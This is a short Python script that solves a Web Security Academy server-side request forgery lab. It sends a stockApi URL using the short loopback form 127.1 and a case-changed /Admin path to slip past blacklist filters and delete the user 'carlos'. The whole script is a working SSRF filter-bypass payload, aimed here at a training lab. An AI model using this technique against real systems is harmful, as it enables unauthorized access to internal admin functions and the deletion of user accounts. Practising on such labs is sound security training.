import requests


lab_id = '0aa400540468c44c823843650015004e' #change based on generated lab
uri = f"https://{lab_id}.web-security-academy.net/product/stock"


# Defeats localhost, 127.0.0.1 check and /admin endpoint check
data = {'stockApi': 'http://127.1/Admin/delete?username=carlos'}

r = requests.post(uri, data=data)
if "Congratulations" in r.text:
    print("solved")
else:
    print("nope")